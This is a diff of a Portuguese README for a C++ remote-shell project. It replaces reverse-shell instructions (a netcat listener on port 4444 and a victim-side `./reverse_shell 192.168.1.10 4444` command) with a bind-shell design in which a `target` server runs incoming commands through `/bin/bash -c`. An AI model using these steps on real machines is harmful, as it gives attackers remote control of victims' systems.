@@ -12,11 +12,11 @@ Este projeto demonstra como implementar uma reverse shell em C++ para fins educa
 
 ## 🚀 Como funciona?
 
-Uma reverse shell conecta-se de volta a um servidor controlado pelo atacante, permitindo a execução remota de comandos.  
+Este projeto implementa uma **bind shell** em C++, onde o alvo executa um servidor que aguarda conexões.  
 **Exemplo de fluxo:**
-1. O atacante inicia um listener (`nc -lvnp 4444`)
-2. A vítima executa o binário da reverse shell
-3. O atacante recebe acesso remoto ao terminal da vítima
+1. O alvo executa o binário `target` (que cria um servidor na porta 8080)
+2. O atacante executa o binário `client` para conectar-se ao alvo
+3. O atacante recebe acesso remoto ao terminal do alvo através do cliente
 
 ---
 
@@ -30,19 +30,41 @@ cd CPP-reverse-shell
 
 ### 2. Compile o projeto
 ```bash
-g++ -o reverse_shell reverse_shell.cpp
+make
 ```
+> Isso gerará os executáveis `client` e `target`  
+> Use `make clean` para remover os arquivos compilados
 
-### 3. Execute o listener no seu servidor
+### 3. Execute o servidor no alvo (máquina que será controlada)
 ```bash
-c -lvnp 4444
+./target
 ```
+> O servidor irá aguardar conexões na porta 8080
 
-### 4. Execute a reverse shell na máquina alvo
+### 4. Conecte-se do cliente (máquina do atacante)
 ```bash
-./reverse_shell <IP_DO_SERVIDOR> <PORTA>
+./client
 ```
-> Exemplo: `./reverse_shell 192.168.1.10 4444`
+> Configure o IP do alvo no código (`client.cpp` linha 27) antes de compilar
+> Atualmente está configurado para "0.0.0.0" - altere para o IP do alvo
+
+---
+
+## 🏗️ Arquitetura
+
+O projeto consiste em dois componentes principais:
+
+- **`target.cpp`**: Servidor que roda na máquina alvo
+  - Cria um socket servidor na porta 8080
+  - Aguarda conexões de clientes
+  - Executa comandos recebidos via `/bin/bash -c`
+  - Retorna a saída dos comandos para o cliente
+
+- **`client.cpp`**: Cliente que se conecta ao alvo
+  - Conecta-se ao servidor target na porta 8080
+  - Permite enviar comandos interativos
+  - Exibe as respostas dos comandos executados
+  - Digite 'exit' ou 'quit' para desconectar
 
 ---
 
